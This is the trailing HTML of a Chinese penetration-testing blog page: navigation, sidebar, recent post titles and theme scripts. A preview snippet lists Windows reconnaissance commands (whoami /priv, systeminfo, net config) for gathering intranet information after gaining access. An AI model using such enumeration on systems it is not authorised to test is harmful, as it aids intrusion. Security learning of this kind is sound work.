title="内网信息收集"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">内网信息收集</div></div><div class="info-2"><div class="info-item-1"> https://mp.weixin.qq.com/s/GkK4AgXsqng6OLAGs45MUg https://www.cnblogs.com/willing-sir/p/16541890.html 谢公子、小迪等众多师傅的  仅供参考，写的比较乱 不同阶段的信息收集有杀软的话 常见的net命令直接无法使用了，如果不小心使用，导致其他命令也无法执行，需要重新传同版本的cmd重新执行命令 无杀软情况下 权限提升阶段权限提升阶段，信息搜集主要看以下几个内容：  本机系统版本 win whoami &#x2F;priv &lt;font style=&quot;color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);&quot;&gt;systeminfo&lt;/font&gt;   全部  &lt;font style=&quot;color:rgb(56, 58, 66);background-color:rgb(250, 250, 250);&quot;&gt;net config...</div></div></div></a><a class="pagination-related" href="/post/58cd1a0.html" title="州弟学安全靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">州弟学安全靶场</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Hundredsu</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Hundredsu"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Hundredsu" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这是Hundredsu的博客,随缘更新</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">简单描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">信息收集：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/7c1aee27.html" title="恶劣环境下（docker）文件传输">恶劣环境下（docker）文件传输</a><time datetime="2025-08-07T13:22:49.000Z" title="发表于 2025-08-07 21:22:49">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/58cd1a0.html" title="州弟学安全靶场">州弟学安全靶场</a><time datetime="2025-08-07T13:21:43.000Z" title="发表于 2025-08-07 21:21:43">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/a36a147c.html" title="从小程序到web的一次测试">从小程序到web的一次测试</a><time datetime="2025-08-07T13:21:19.000Z" title="发表于 2025-08-07 21:21:19">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/7aba0c03.html" title="内网信息收集">内网信息收集</a><time datetime="2025-08-07T10:03:02.000Z" title="发表于 2025-08-07 18:03:02">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/7f69f64e.html" title="SQL注入绕waf总结">SQL注入绕waf总结</a><time datetime="2025-08-07T10:02:25.000Z" title="发表于 2025-08-07 18:02:25">2025-08-07</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2020 - 2025 By Hundredsu</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.3.4"></script><script src="/js/main.js?v=5.3.4"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.3.4"></script></div></div></body></html>
